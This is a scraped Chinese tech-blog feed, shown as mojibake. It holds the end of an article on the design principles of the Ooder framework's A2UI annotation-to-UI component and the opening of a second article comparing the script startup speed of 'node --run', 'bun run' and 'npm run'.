</ol>
<h2 data-id="heading-49">æ¶æ„ä¼˜åŠ¿ä¸è®¾è®¡å“²å­¦</h2>
<h3 data-id="heading-50">1. æ¶æ„ä¼˜åŠ¿</h3>
<p>A2UIæ¶æ„å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<h4 data-id="heading-51">1.1 å¯æ‰©å±•æ€§</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb7c492127104c74ba7b7e4c73b1247e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=swGE5GNygTJs64OhBS82pAkiPNc%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-52">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>æ³¨è§£æ‰©å±•</strong>
<ul>
<li>é€šè¿‡æ·»åŠ æ–°çš„æ³¨è§£æ”¯æŒæ–°åŠŸèƒ½</li>
<li>æ³¨è§£çš„è§£æè§„åˆ™æ˜¯ç»Ÿä¸€çš„</li>
<li>ä¸éœ€è¦ä¿®æ”¹æ ¸å¿ƒä»£ç </li>
</ul>
</li>
<li><strong>ç»„ä»¶æ‰©å±•</strong>
<ul>
<li>é€šè¿‡æ·»åŠ æ–°çš„UIç»„ä»¶æ”¯æŒæ–°UIå…ƒç´ </li>
<li>ç»„ä»¶çš„æ³¨å†Œæœºåˆ¶æ˜¯ç»Ÿä¸€çš„</li>
<li>ä¸éœ€è¦ä¿®æ”¹æ ¸å¿ƒä»£ç </li>
</ul>
</li>
<li><strong>ç±»å‹æ‰©å±•</strong>
<ul>
<li>é€šè¿‡æ·»åŠ æ–°çš„ç±»å‹æ˜ å°„æ”¯æŒæ–°æ•°æ®ç±»å‹</li>
<li>ç±»å‹æ˜ å°„çš„è§„åˆ™æ˜¯ç»Ÿä¸€çš„</li>
<li>ä¸éœ€è¦ä¿®æ”¹æ ¸å¿ƒä»£ç </li>
</ul>
</li>
</ol>
<h4 data-id="heading-53">1.2 å¯ç»´æŠ¤æ€§</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b9506434b6e41539a20cf8ed3b7ed13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=Xbiry0f8Mf1%2B2lHMvD56Pl6evF8%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-54">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>åˆ†å±‚æ¶æ„</strong>
<ul>
<li>æ¯å±‚æœ‰æ˜ç¡®çš„èŒè´£</li>
<li>å±‚ä¸å±‚ä¹‹é—´é€šè¿‡æ¥å£é€šä¿¡</li>
<li>ä¾¿äºç†è§£å’Œç»´æŠ¤</li>
</ul>
</li>
<li><strong>å•ä¸€èŒè´£</strong>
<ul>
<li>æ¯ä¸ªç±»åªè´Ÿè´£ä¸€ä¸ªåŠŸèƒ½</li>
<li>ç±»çš„èŒè´£æ¸…æ™°</li>
<li>ä¾¿äºæµ‹è¯•å’Œç»´æŠ¤</li>
</ul>
</li>
<li><strong>é›†ä¸­è§„åˆ™</strong>
<ul>
<li>è§„åˆ™é›†ä¸­åœ¨é…ç½®ç±»ä¸­</li>
<li>ä¾¿äºä¿®æ”¹å’Œæ‰©å±•</li>
<li>é¿å…è§„åˆ™åˆ†æ•£</li>
</ul>
</li>
</ol>
<h4 data-id="heading-55">1.3 ç¡®å®šæ€§</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f33cfde8024947af86da4a1d180bade4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=6FkehMpMVTSq%2Fjym4R3Ij7MghEs%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-56">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>äº”å±‚ç¡®å®šæ€§</strong>
<ul>
<li>æ¯å±‚éƒ½æœ‰æ˜ç¡®çš„ç¡®å®šæ€§ä¿éšœ</li>
<li>å±‚ä¸å±‚ä¹‹é—´ç›¸äº’è¡¥å……</li>
<li>ä¿è¯ç»“æœçš„å¯é¢„æµ‹æ€§</li>
</ul>
</li>
<li><strong>æœ‰åºå¤„ç†</strong>
<ul>
<li>å­—æ®µæŒ‰ç…§å£°æ˜é¡ºåºå¤„ç†</li>
<li>æ–¹æ³•æŒ‰ç…§å£°æ˜é¡ºåºå¤„ç†</li>
<li>ä¿è¯å¤„ç†é¡ºåºçš„ç¨³å®šæ€§</li>
</ul>
</li>
<li><strong>å›ºå®šè§„åˆ™</strong>
<ul>
<li>ç±»å‹æ˜ å°„è§„åˆ™æ˜¯å›ºå®šçš„</li>
<li>ç»„ä»¶æ˜ å°„è§„åˆ™æ˜¯å›ºå®šçš„</li>
<li>ä¿è¯æ˜ å°„ç»“æœçš„ä¸€è‡´æ€§</li>
</ul>
</li>
</ol>
<h4 data-id="heading-57">1.4 çµæ´»æ€§</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928f0ee6baf14165beab075d64f28f22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=UrQL0hLCRtCZTYk6tM2%2BlsZwU7s%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-58">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>å­—æ®µå’Œæ–¹æ³•ä¸¤ç§å®šä¹‰æ–¹å¼</strong>
<ul>
<li>æ”¯æŒå­—æ®µå®šä¹‰</li>
<li>æ”¯æŒæ–¹æ³•å®šä¹‰</li>
<li>æ»¡è¶³ä¸åŒçš„å¼€å‘ä¹ æƒ¯</li>
</ul>
</li>
<li><strong>æ³¨è§£è¦†ç›–é»˜è®¤è¡Œä¸º</strong>
<ul>
<li>æ”¯æŒé€šè¿‡æ³¨è§£è¦†ç›–é»˜è®¤è¡Œä¸º</li>
<li>æ”¯æŒçµæ´»çš„é…ç½®</li>
<li>æ»¡è¶³ä¸åŒçš„ä¸šåŠ¡éœ€æ±‚</li>
</ul>
</li>
<li><strong>è‡ªå®šä¹‰ç»„ä»¶æ˜ å°„</strong>
<ul>
<li>æ”¯æŒè‡ªå®šä¹‰ç»„ä»¶æ˜ å°„</li>
<li>æ”¯æŒè‡ªå®šä¹‰ç»„ä»¶</li>
<li>æ»¡è¶³ä¸åŒçš„UIéœ€æ±‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-59">2. è®¾è®¡å“²å­¦</h3>
<p>A2UIçš„è®¾è®¡å“²å­¦ä½“ç°äº†ä»¥ä¸‹åŸåˆ™ï¼š</p>
<h4 data-id="heading-60">2.1 çº¦å®šä¼˜äºé…ç½®</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39d23753c3dc44b88ab58a4d6dab7c09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=kE5pbZWZ7SyOISQTEaeTWtYEKWQ%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-61">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>é»˜è®¤è¡Œä¸º</strong>
<ul>
<li>æä¾›åˆç†çš„é»˜è®¤å€¼</li>
<li>å‡å°‘é…ç½®çš„å·¥ä½œé‡</li>
<li>æé«˜å¼€å‘æ•ˆç‡</li>
</ul>
</li>
<li><strong>æœ€å°é…ç½®</strong>
<ul>
<li>åªåœ¨å¿…è¦æ—¶é…ç½®</li>
<li>å‡å°‘é…ç½®æ–‡ä»¶</li>
<li>ç®€åŒ–é¡¹ç›®ç»“æ„</li>
</ul>
</li>
<li><strong>æ˜¾å¼è¦†ç›–</strong>
<ul>
<li>éœ€è¦æ—¶æ˜¾å¼è¦†ç›–</li>
<li>é…ç½®æ„å›¾æ˜ç¡®</li>
<li>é¿å…éšå¼è¡Œä¸º</li>
</ul>
</li>
</ol>
<h4 data-id="heading-62">2.2 å¼€é—­åŸåˆ™</h4>
<p>â€‹</p>
<p>â€‹</p>
<p>â€‹</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/506a676e4ca54460b41e4492a11fae12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=aNN7otGkIMqX5tT3lcu8mcGWsyY%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p>â€‹</p>
<p>â€‹</p>
<p>â€‹</p>
<h4 data-id="heading-63">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>å¯¹æ‰©å±•å¼€æ”¾</strong>
<ul>
<li>æ”¯æŒæ·»åŠ æ–°çš„æ³¨è§£</li>
<li>æ”¯æŒæ·»åŠ æ–°çš„ç»„ä»¶</li>
<li>æ”¯æŒæ·»åŠ æ–°çš„ç±»å‹æ˜ å°„</li>
</ul>
</li>
<li><strong>å¯¹ä¿®æ”¹å…³é—­</strong>
<ul>
<li>ä¸éœ€è¦ä¿®æ”¹æ ¸å¿ƒä»£ç </li>
<li>æ ¸å¿ƒä»£ç ä¿æŒç¨³å®š</li>
<li>ä¿è¯å‘åå…¼å®¹</li>
</ul>
</li>
</ol>
<h4 data-id="heading-64">2.3 ä¾èµ–å€’ç½®åŸåˆ™</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e6f28f714fd43688c11c05ab96c6344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=m%2B2nwmagulKgp3KFt9CHgamL58g%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h4 data-id="heading-65">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¾èµ–æŠ½è±¡</strong>
<ul>
<li>ä¾èµ–BridgeFieldæ¥å£</li>
<li>ä¾èµ–BridgeClassæ¥å£</li>
<li>ä¾èµ–BridgeMethodConfigæ¥å£</li>
</ul>
</li>
<li><strong>ä¸ä¾èµ–å®ç°</strong>
<ul>
<li>ä¸ä¾èµ–å…·ä½“çš„å­—æ®µç±»</li>
<li>ä¸ä¾èµ–å…·ä½“çš„ç»„ä»¶ç±»</li>
<li>ä¸ä¾èµ–å…·ä½“çš„æ–¹æ³•ç±»</li>
</ul>
</li>
</ol>
<h4 data-id="heading-66">2.4 å•ä¸€èŒè´£åŸåˆ™</h4>
<p>â€‹</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9542af01c59a4788b4c8bcc703bfb01a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=adO5OZF5EdYAu4LxlM1T0rKYEKc%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p>â€‹</p>
<h4 data-id="heading-67">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸€ä¸ªç±»ä¸€ä¸ªèŒè´£</strong>
<ul>
<li>BridgeClassï¼šç±»åˆ†æ</li>
<li>BridgeFieldConfigï¼šå­—æ®µé…ç½®</li>
<li>BridgeMethodConfigï¼šæ–¹æ³•é…ç½®</li>
<li>C2UConfigFactoryï¼šç»„ä»¶æ˜ å°„</li>
<li>OODTypeMappingï¼šç±»å‹æ˜ å°„</li>
</ul>
</li>
<li><strong>ä¸“æ³¨çš„åŠŸèƒ½</strong>
<ul>
<li>æ¯ä¸ªç±»åªè´Ÿè´£ä¸€ä¸ªåŠŸèƒ½</li>
<li>åŠŸèƒ½è¾¹ç•Œæ¸…æ™°</li>
<li>ä¾¿äºç†è§£å’Œç»´æŠ¤</li>
</ul>
</li>
</ol>
<h2 data-id="heading-68">æ€»ç»“</h2>
<p>A2UIï¼ˆAnnotation to UIï¼‰æ˜¯Ooderæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œé€šè¿‡æ³¨è§£é©±åŠ¨çš„åå°„åˆ†æï¼Œå°†Javaç±»è‡ªåŠ¨è½¬æ¢ä¸ºUIç»„ä»¶ã€‚å…¶æ ¸å¿ƒé€»è¾‘åŒ…æ‹¬ï¼š</p>
<h3 data-id="heading-69">æ ¸å¿ƒæœºåˆ¶</h3>
<ol>
<li><strong>å…­é˜¶æ®µæ‹†è§£æµç¨‹</strong>
<ul>
<li>ç±»åŠ è½½é˜¶æ®µ</li>
<li>æ³¨è§£è§£æé˜¶æ®µ</li>
<li>å­—æ®µæ‹†è§£é˜¶æ®µ</li>
<li>æ–¹æ³•æ‹†è§£é˜¶æ®µ</li>
<li>ç±»å‹æ˜ å°„é˜¶æ®µ</li>
<li>ç»„ä»¶ç”Ÿæˆé˜¶æ®µ</li>
</ul>
</li>
<li><strong>äº”å±‚ç¡®å®šæ€§ä¿éšœ</strong>
<ul>
<li>æ³¨è§£å±‚ç¡®å®šæ€§</li>
<li>ç±»å‹å±‚ç¡®å®šæ€§</li>
<li>å‘½åçº¦å®šå±‚ç¡®å®šæ€§</li>
<li>ç´¢å¼•å±‚ç¡®å®šæ€§</li>
<li>æ˜ å°„è§„åˆ™å±‚ç¡®å®šæ€§</li>
</ul>
</li>
<li><strong>å…­å¤§ç»„ç»‡åŸåˆ™</strong>
<ul>
<li>å­—æ®µä¼˜å…ˆåŸåˆ™</li>
<li>Getter/Setterè¯†åˆ«åŸåˆ™</li>
<li>æ³¨è§£ä¼˜å…ˆçº§åŸåˆ™</li>
<li>ç´¢å¼•æ’åºåŸåˆ™</li>
<li>ç±»å‹æ¨æ–­åŸåˆ™</li>
<li>ç»„ä»¶æ˜ å°„åŸåˆ™</li>
</ul>
</li>
</ol>
<h3 data-id="heading-70">è®¾è®¡ä¼˜åŠ¿</h3>
<ol>
<li><strong>å¯æ‰©å±•æ€§</strong>
<ul>
<li>æ”¯æŒæ³¨è§£æ‰©å±•</li>
<li>æ”¯æŒç»„ä»¶æ‰©å±•</li>
<li>æ”¯æŒç±»å‹æ‰©å±•</li>
</ul>
</li>
<li><strong>å¯ç»´æŠ¤æ€§</strong>
<ul>
<li>åˆ†å±‚æ¶æ„</li>
<li>å•ä¸€èŒè´£</li>
<li>é›†ä¸­è§„åˆ™</li>
</ul>
</li>
<li><strong>ç¡®å®šæ€§</strong>
<ul>
<li>äº”å±‚ç¡®å®šæ€§ä¿éšœ</li>
<li>æœ‰åºå¤„ç†</li>
<li>å›ºå®šè§„åˆ™</li>
</ul>
</li>
<li><strong>çµæ´»æ€§</strong>
<ul>
<li>å­—æ®µå’Œæ–¹æ³•ä¸¤ç§å®šä¹‰æ–¹å¼</li>
<li>æ³¨è§£è¦†ç›–é»˜è®¤è¡Œä¸º</li>
<li>è‡ªå®šä¹‰ç»„ä»¶æ˜ å°„</li>
</ul>
</li>
</ol>
<h3 data-id="heading-71">è®¾è®¡å“²å­¦</h3>
<ol>
<li><strong>çº¦å®šä¼˜äºé…ç½®</strong>
<ul>
<li>æä¾›åˆç†çš„é»˜è®¤å€¼</li>
<li>æœ€å°åŒ–é…ç½®</li>
<li>æ˜¾å¼è¦†ç›–</li>
</ul>
</li>
<li><strong>å¼€é—­åŸåˆ™</strong>
<ul>
<li>å¯¹æ‰©å±•å¼€æ”¾</li>
<li>å¯¹ä¿®æ”¹å…³é—­</li>
</ul>
</li>
<li><strong>ä¾èµ–å€’ç½®åŸåˆ™</strong>
<ul>
<li>ä¾èµ–æŠ½è±¡</li>
<li>ä¸ä¾èµ–å®ç°</li>
</ul>
</li>
<li><strong>å•ä¸€èŒè´£åŸåˆ™</strong>
<ul>
<li>ä¸€ä¸ªç±»ä¸€ä¸ªèŒè´£</li>
<li>ä¸“æ³¨çš„åŠŸèƒ½</li>
<li>æ˜“äºæµ‹è¯•</li>
</ul>
</li>
</ol>
<p>A2UIé€šè¿‡è¿™äº›æœºåˆ¶å’ŒåŸåˆ™ï¼Œå®ç°äº†ä»Javaç±»åˆ°UIç»„ä»¶çš„è‡ªåŠ¨åŒ–è½¬æ¢ï¼Œä¸ºOoderæ¡†æ¶æä¾›äº†å¼ºå¤§çš„"é…ç½®å³ä»£ç "èƒ½åŠ›ã€‚è¿™ä¸€è®¾è®¡ä¸ä»…æé«˜äº†å¼€å‘æ•ˆç‡ï¼Œä¹Ÿä¿è¯äº†ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<p>Â© 2024 Ooder Framework. All rights reserved.</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js è‡ªå¸¦â€œåŠ é€Ÿå™¨â€ï¼šnode --run æ˜¯å¦æ¯” Bun æ›´å¿«ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7602246300454436899</link>    <guid>https://juejin.cn/post/7602246300454436899</guid>    <pubDate>2026-02-03T14:17:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602246300454436899" data-draft-id="7584353612501368873" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js è‡ªå¸¦â€œåŠ é€Ÿå™¨â€ï¼šnode --run æ˜¯å¦æ¯” Bun æ›´å¿«ï¼Ÿ"/> <meta itemprop="keywords" content="Bun,Node.js,deno"/> <meta itemprop="datePublished" content="2026-02-03T14:17:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Legend80s"/> <meta itemprop="url" content="https://juejin.cn/user/2568105753839790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js è‡ªå¸¦â€œåŠ é€Ÿå™¨â€ï¼šnode --run æ˜¯å¦æ¯” Bun æ›´å¿«ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2568105753839790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Legend80s
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:17:36.000Z" title="Tue Feb 03 2026 14:17:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ JavaScript åç«¯è¿è¡Œæ—¶é¢†åŸŸï¼Œé€Ÿåº¦ä¸€ç›´æ˜¯æ ¸å¿ƒæˆ˜åœºã€‚è¿‘å¹´æ¥ï¼ŒBun ä»¥å…¶å®£ç§°çš„â€œä¸€ä½“åŒ–â€å·¥å…·é“¾å’Œé—ªç”µèˆ¬çš„å¯åŠ¨é€Ÿåº¦å¼‚å†›çªèµ·ï¼Œå¯¹è€ç‰Œç‹è€… Node.js å‘èµ·äº†å¼ºåŠ²æŒ‘æˆ˜ã€‚<code>bun run</code>Â çš„è¿…æ·ï¼Œè®©è®¸å¤šå¼€å‘è€…å¼€å§‹é‡æ–°è¯„ä¼°ä»–ä»¬çš„å·¥å…·é€‰æ‹©ã€‚</p>
<p>ç„¶è€Œï¼ŒNode.js å¹¶æœªæ­¢æ­¥ã€‚è‡ª v22.0.0 èµ·ï¼Œå®ƒæ‚„ç„¶å¼•å…¥äº†ä¸€ä¸ªä¸“ä¸ºå¯åŠ¨æ€§èƒ½è€Œç”Ÿçš„ç§˜å¯†æ­¦å™¨ï¼š<code>node --run</code>ã€‚è¿™ä¸ªå†…ç½®äº Node.js æ ¸å¿ƒçš„å‘½ä»¤ï¼Œæ—¨åœ¨ä»¥æœ€ç²¾ç®€ã€æœ€ç›´æ¥çš„æ–¹å¼æ‰§è¡ŒÂ <code>package.json</code>Â ä¸­çš„è„šæœ¬ï¼Œå®£ç§°è¦ä¸ºæœ€å¸¸è§çš„ç”¨ä¾‹æä¾›â€œé¡¶çº§æ€§èƒ½â€ã€‚</p>
<p>è¿™å¼•å‘äº†æˆ‘ä»¬çš„å¥½å¥‡ï¼šåœ¨çœŸå®çš„åœºæ™¯ä¸‹ï¼Œè¿™ä½æ–°ç§€çš„è¡¨ç°ç©¶ç«Ÿå¦‚ä½•ï¼Ÿå®ƒä¸Â <code>bun run</code>Â åŠä¼ ç»Ÿçš„Â <code>npm run</code>Â ç›¸æ¯”ï¼Œå­°ä¼˜å­°åŠ£ï¼Ÿ</p>
<p>æœ¬æ–‡å°†é€šè¿‡ä¸€ç³»åˆ—ä¸¥è°¨çš„å¯¹æ¯”æµ‹è¯•ï¼Œæ­å¼€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest%2Fapi%2Fcli.html%23--run" target="_blank" title="https://nodejs.org/docs/latest/api/cli.html#--run" ref="nofollow noopener noreferrer"><code>node --run</code></a>Â çš„ç¥ç§˜é¢çº±ï¼Œç”¨æ•°æ®å›ç­”ï¼šåœ¨ 2026 å¹´çš„è„šæœ¬å¯åŠ¨æ€§èƒ½ç«èµ›ä¸­ï¼Œè°æ‰æ˜¯çœŸæ­£çš„é€Ÿåº¦ç‹è€…ï¼Ÿ</p>
<p><strong/></p><p align="center"><strong>å„ä½å°ä¼™ä¼´è¯·æ³¨æ„ï¼æœ¬æ–‡å°†é¢ è¦†è¿™ä¸ªä¼ ç»Ÿè§‚å¿µâ€œbun å¯åŠ¨ä¸€å®šæ¯” Node.js æ›´å¿«â€ã€‚</strong></p><p/>
<hr/>
<p>é¦–å…ˆæˆ‘ä»¬å›é¡¾ä¸‹ Node.js è¿è¡Œæ–‡ä»¶æœ‰ä¸‰ç§æ–¹å¼ï¼š</p>
<ol>
<li>ç›´æ¥å¯åŠ¨ <code>node foo.[jt]s</code> ğŸ¤¼â€â™‚ï¸ <code>bun foo.[jt]s</code></li>
<li>package.json è„šæœ¬è¿è¡Œ <code>npm run foo</code> ğŸ¤¼â€â™‚ï¸ <code>bun run foo</code></li>
